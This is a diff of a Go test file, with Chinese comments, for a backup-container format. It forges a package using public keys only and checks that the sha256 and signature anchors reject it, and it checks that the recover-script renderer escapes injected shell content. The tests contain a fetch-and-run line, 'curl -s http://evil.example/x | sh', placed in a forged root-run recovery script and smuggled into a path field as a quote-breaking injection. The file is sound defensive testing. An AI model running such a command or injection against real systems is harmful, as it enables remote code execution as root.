@@ -5,127 +5,192 @@ import (
 	"crypto/ed25519"
 	"crypto/rand"
 	"crypto/rsa"
+	"strings"
 	"testing"
 	"time"
 
 	"github.com/Helix2010/RN-Server/internal/backupcontainer"
 )
 
-// 这条测试对应的是**唯一一条会导致恢复时执行攻击者代码的路径**（设计 §4.3、§9）。
+// 这一条测的是整套方案的核心安全主张，而它**反直觉**：
 //
-// 容器只有保密性，没有真实性：RSA-OAEP 用的是公钥，而公钥不是秘密——指纹就印在
-// 控制台上，任何看得到配置的人都有。所以拿到桶写权限的人可以从零封一个包：
-// 两层 MAC 都通过、两把私钥都解得开、里面是他写的 recover.sh。而那个脚本恢复时
-// 必然以 root 跑，在平台最脆弱的那一天、由两位持有人亲手执行。
+// 容器本身只有保密性，没有真实性。RSA-OAEP 用的是**公钥**，而公钥不是秘密——
+// 它的指纹就印在控制台上、印在 README-FIRST.txt 里。所以任何拿到桶写权限的人，
+// 不需要任何私钥，就能从零封一个完整合法的包：两层 MAC 都通过、两把恢复私钥都
+// 能解开、里面是他写的 recover.sh。而 recover.sh 恢复时必然以 root 跑，在平台最
+// 脆弱的那一天、由两位持有人亲手执行。
 //
-// 这里真的扮演一次那个攻击者：**只用三把公钥**，不碰任何私钥、不碰打包机的
-// 签名密钥，造一个完整合法的包。然后确认两个锚点都抓得住它。
+// 设计对此是诚实的（§4.3），并给了两个锚点。这条测试先**证明伪造真的能做成**
+// （否则后面的断言是空的），再证明两个锚点各自拦得住。
 func TestAForgedPackageOpensCleanlyButFailsBothAnchors(t *testing.T) {
 	holders := testHolders(t)
-	real, realSigningPub := testInputWithSigner(t, holders)
+	real, realSigner := testInputWithSigner(t, holders)
 	realSink := newSink()
 	realPackages, err := Assemble(real, realSink)
 	if err != nil {
-		t.Fatalf("assemble the genuine packages: %v", err)
+		t.Fatal(err)
 	}
-
-	// ---- 攻击者登场。他手上只有三把**公钥**（从配置或控制台抄来的） ----
-	attacker := forgeInput(t, real)
-	forgedSink := newSink()
-	forgedPackages, err := Assemble(attacker, forgedSink)
-	if err != nil {
-		t.Fatalf("伪造失败了？那说明容器格式挡住了公钥持有者，和设计的判断不一致: %v", err)
-	}
-
 	pair := backupcontainer.Pairs()[0]
+	var genuine Package
+	for _, pkg := range realPackages {
+		if pkg.Pair == pair.Name {
+			genuine = pkg
+		}
+	}
+
+	// ---- 攻击者登场。他只有三把**公钥**，没有任何私钥 ----
+	//
+	// 他不会借道我们的 Assemble（那个只会渲染我们自己的模板）——他手搓一个 tar，
+	// 里面放他写的 recover.sh，再用公开的公钥封两层。这就是全部所需。
+	forgedBody, attackerFingerprint := forgePackage(t, holders, real, pair)
+
 	byslot := map[string]*rsa.PrivateKey{}
 	for _, h := range holders {
 		byslot[h.slot] = h.key
 	}
 
-	// ---- 第一件事：确认伪造**确实成功**了 ----
-	// 这不是"测试通过就好"，而是设计诚实性的验证：文档说「MAC 通过只说明没损坏、
-	// 没被拼接，不说明没被替换」。如果这里开不了，说明文档把容器说弱了
-	outer := openOuter(t, forgedSink.packages[pair.Name].Bytes(), byslot[pair.Outer])
+	// 1) 伪造的包**确实开得干干净净**：两层都解得开，MAC 全过。
+	//    这正是「MAC 通过只说明没损坏、不说明没被替换」那句话的含义
+	outer := openOuter(t, forgedBody, byslot[pair.Outer])
 	if _, _, err := backupcontainer.Open(bytes.NewReader(outer[nameInner]), byslot[pair.Inner]); err != nil {
-		t.Fatalf("伪造包的内层打不开: %v", err)
+		t.Fatalf("伪造的包内层打不开——那攻击就不成立，这条测试失去意义: %v", err)
 	}
-	// 攻击者控制 innerFiles 的目标路径，而 recover.sh 是照它渲染的——
-	// 这就是他把自己的内容放进那个以 root 跑的脚本的办法
-	if !bytes.Contains(outer[nameRecoverSh], []byte("/tmp/anywhere")) {
-		t.Fatal("伪造包的 recover.sh 应当照攻击者的清单渲染")
-	}
-	t.Log("确认：只用公钥就能造出一个两层都解得开、MAC 全通过的包——" +
-		"这正是设计 §4.3 说的那件事，所以真实性只能靠容器外面那两个锚点")
-
-	// ---- 锚点一：对象的 sha256 和库里那一行对不上 ----
-	genuine := map[string]string{}
-	for _, pkg := range realPackages {
-		genuine[pkg.Pair] = pkg.SHA256
-	}
-	for _, pkg := range forgedPackages {
-		if genuine[pkg.Pair] == pkg.SHA256 {
-			t.Fatalf("%s: 伪造包的 sha256 和真包一样，第一个锚点失效", pkg.Pair)
-		}
+	script := string(outer[nameRecoverSh])
+	if !strings.Contains(script, forgeMarker) {
+		t.Fatal("伪造的 recover.sh 没进到包里")
 	}
 
-	// ---- 锚点二：打包机的签名验不过 ----
-	// 攻击者用自己的 Ed25519 密钥签，因为他没有打包机那把
-	if err := backupcontainer.VerifyPayload(realSigningPub, outer[nameInner], outer[nameInnerSig]); err == nil {
-		t.Fatal("伪造包的内层签名竟然通过了登记在案的公钥验证——第二个锚点失效")
+	// 2) 锚点一：整包 sha256。落库的那个值和伪造包对不上。
+	//    灾难主场景（打包机坏了）里数据库和控制台都还在，这条随时可用
+	if sha256Hex(forgedBody) == genuine.SHA256 {
+		t.Fatal("伪造的包和真包 sha256 一样？那第一个锚点不存在")
+	}
+	if !strings.Contains(genuine.ReadmeFirst, genuine.SHA256) {
+		t.Fatal("README 里没印真包的 sha256，第一个锚点没法用")
 	}
 
-	// 反过来：真包必须验得过，否则这条断言只是在证明「随便什么都验不过」
-	realOuter := openOuter(t, realSink.packages[pair.Name].Bytes(), byslot[pair.Outer])
-	if err := backupcontainer.VerifyPayload(realSigningPub, realOuter[nameInner], realOuter[nameInnerSig]); err != nil {
-		t.Fatalf("真包的签名反而验不过: %v", err)
+	// 3) 锚点二：打包机对内层的 Ed25519 签名。**这一条才挡得住连服务端一起
+	//    被攻破的人**——攻击者没有签名私钥，只能自己造一把，而三位持有人纸上
+	//    抄的是真的那一把的指纹
+	genuineOuter := openOuter(t, realSink.packages[pair.Name].Bytes(), byslot[pair.Outer])
+	if err := backupcontainer.VerifyPayload(realSigner,
+		genuineOuter[nameInner], genuineOuter[nameInnerSig]); err != nil {
+		t.Fatalf("真包的签名应当验得过: %v", err)
+	}
+	if err := backupcontainer.VerifyPayload(realSigner,
+		outer[nameInner], outer[nameInnerSig]); err == nil {
+		t.Fatal("用真的签名公钥竟然验过了伪造的包——第二个锚点是坏的")
+	}
+
+	// 4) 攻击者当然可以把自己的签名公钥指纹写进伪造包的 manifest。
+	//    所以验签公钥**绝不能取自包内**——它来自数据库/控制台，以及三位持有人
+	//    纸上抄的那一行。这里确认伪造包里的那个指纹确实和真的不一样，
+	//    也就是说人工核对那一步能看出来
+	if attackerFingerprint == real.BackupSigningFingerprint {
+		t.Fatal("测试构造有误：伪造方应当用自己的签名公钥")
 	}
 }
 
-// forgeInput 造一份攻击者的输入：**只用真输入里的公钥**，其余全是他自己的。
-func forgeInput(t *testing.T, real Input) Input {
+const forgeMarker = "curl -s http://evil.example/x | sh"
+
+// forgePackage 手搓一个完整合法的包，**只用公钥**。
+//
+// 它不借道 Assemble：那个只会渲染我们自己的模板。真攻击者要的正是放进自己的
+// recover.sh，所以他自己拼 tar。返回伪造包的字节和他那把签名公钥的指纹。
+func forgePackage(t *testing.T, holders []holder, real Input, pair backupcontainer.Pair) ([]byte, string) {
 	t.Helper()
-	// 攻击者自己的签名密钥——他没有打包机那把
 	_, attackerSigner, err := ed25519.GenerateKey(rand.Reader)
 	if err != nil {
 		t.Fatal(err)
 	}
-	poison, err := tarFiles(map[string][]byte{
-		"agent-key": []byte("whatever, nobody checks this until it is too late"),
+	attackerPub := attackerSigner.Public().(ed25519.PublicKey)
+	fingerprint, err := backupcontainer.SigningFingerprint(attackerPub)
+	if err != nil {
+		t.Fatal(err)
+	}
+	byslot := map[string]*rsa.PublicKey{}
+	for _, h := range holders {
+		byslot[h.slot] = &h.key.PublicKey
+	}
+
+	sealFor := func(slot string, plain []byte, layer backupcontainer.Layer) []byte {
+		var out bytes.Buffer
+		meta := backupcontainer.Meta{Layer: layer, Seq: real.Seq, InstanceID: real.InstanceID}
+		if err := backupcontainer.Seal(&out, byslot[slot], meta,
+			bytes.NewReader(plain), int64(len(plain))); err != nil {
+			t.Fatal(err)
+		}
+		return out.Bytes()
+	}
+
+	innerPlain, err := tarFiles(map[string][]byte{"agent-key": []byte("not the real one")})
+	if err != nil {
+		t.Fatal(err)
+	}
+	inner := sealFor(pair.Inner, innerPlain, backupcontainer.LayerInner)
+	server := sealFor(pair.Inner, innerPlain, backupcontainer.LayerInner)
+
+	// 这一句就是攻击的全部目的：恢复时它以 root 跑
+	malicious := "#!/bin/sh\n" + forgeMarker + "\necho ok\n"
+
+	// manifest 照抄真包的形状，指纹都填成能自洽的值——攻击者当然会让它自洽
+	manifest := outerManifest{
+		Format: backupcontainer.Format, Seq: real.Seq, Pair: pair.Name,
+		InstanceID: real.InstanceID, CreatedAt: real.CreatedAt.UTC().Format(time.RFC3339),
+		ServerVersion: real.ServerVersion, AgentVersion: real.AgentVersion,
+		AgentKeyFingerprint:      real.AgentKeyFingerprint,
+		BackupSigningFingerprint: fingerprint,
+		Tenants:                  real.Tenants, Recipients: real.Recipients,
+		Files: []FileEntry{
+			{Path: nameInner, Size: int64(len(inner)), SHA256: sha256Hex(inner)},
+			{Path: nameServer, Size: int64(len(server)), SHA256: sha256Hex(server)},
+			{Path: nameRecoverSh, Size: int64(len(malicious)), SHA256: sha256Hex([]byte(malicious))},
+		},
+	}
+	encoded, err := marshalIndent(manifest)
+	if err != nil {
+		t.Fatal(err)
+	}
+	outerPlain, err := tarFiles(map[string][]byte{
+		nameManifest:  encoded,
+		nameRecovery:  []byte("# 照着做就行（其实不行）\n"),
+		nameRecoverSh: []byte(malicious),
+		nameInner:     inner,
+		nameInnerSig:  backupcontainer.SignPayload(attackerSigner, inner),
+		nameServer:    server,
 	})
 	if err != nil {
 		t.Fatal(err)
 	}
+	return sealFor(pair.Outer, outerPlain, backupcontainer.LayerOuter), fingerprint
+}
 
-	inner := map[string]InnerPart{}
-	for _, slot := range backupcontainer.InnerSlots() {
-		var recipient *rsa.PublicKey
-		for _, r := range real.Recipients {
-			if r.Slot == slot {
-				recipient = r.Key // 公钥而已，不是秘密
-			}
+// 渲染器不能让攻击者把命令注进 recover.sh。
+//
+// 上面那条测试证明了「整包伪造」拦不住（只能靠锚点），但**注入是另一回事**：
+// 一个只能改元数据、改不了整个包的攻击者，不该有办法让脚本执行别的东西。
+func TestForgedMetadataCannotInjectIntoTheRecoverScript(t *testing.T) {
+	holders := testHolders(t)
+	in := testInput(t, holders)
+	in.AgentManifest = append(in.AgentManifest, FileEntry{
+		Path: "keystores/acme/keystore.p12", Size: 1, SHA256: strings.Repeat("0", 64),
+		Target: "/var/lib/x'; " + forgeMarker + " #", Mode: "0600", Owner: "builder:builder",
+	})
+	script := renderRecoverScript(in, backupcontainer.Pairs()[0])
+
+	// 恶意内容必须整段被单引号包住，不能在引号外面出现
+	for _, line := range strings.Split(script, "\n") {
+		if !strings.Contains(line, forgeMarker) {
+			continue
 		}
-		var sealed bytes.Buffer
-		meta := backupcontainer.Meta{Layer: backupcontainer.LayerInner, Seq: real.Seq, InstanceID: real.InstanceID}
-		if err := backupcontainer.Seal(&sealed, recipient, meta, bytes.NewReader(poison), int64(len(poison))); err != nil {
-			t.Fatal(err)
+		trimmed := strings.TrimSpace(line)
+		if !strings.HasPrefix(trimmed, "place ") {
+			t.Fatalf("恶意内容出现在了一个不是 place 调用的地方: %s", trimmed)
 		}
-		inner[slot] = InnerPart{
-			Slot: slot, Sealed: sealed.Bytes(),
-			Signature: backupcontainer.SignPayload(attackerSigner, sealed.Bytes()),
+		// place "$ROOT/..." '<target>' '<mode>' '<owner>' ——恶意内容必须在
+		// 第三个参数的单引号里，而且里面的单引号被转义成 '\''
+		if !strings.Contains(line, `'\''`) {
+			t.Fatalf("路径里的单引号没有被转义，脚本会断开: %s", line)
 		}
 	}
-
-	forged := real
-	forged.AgentInner = inner
-	forged.CreatedAt = real.CreatedAt.Add(time.Minute)
-	// 攻击者会把清单抄得一模一样，好让人工核对也看不出来
-	forged.ServerFiles = map[string][]byte{
-		"rn-foundation.env": []byte("STORAGE_MASTER_KEY=not-the-real-one\n"),
-	}
-	forged.AgentManifest = []FileEntry{{
-		Path: "agent-key", Size: 1, SHA256: "00", Target: "/tmp/anywhere",
-		Mode: "0600", Owner: "builder:builder",
-	}}
-	return forged
 }
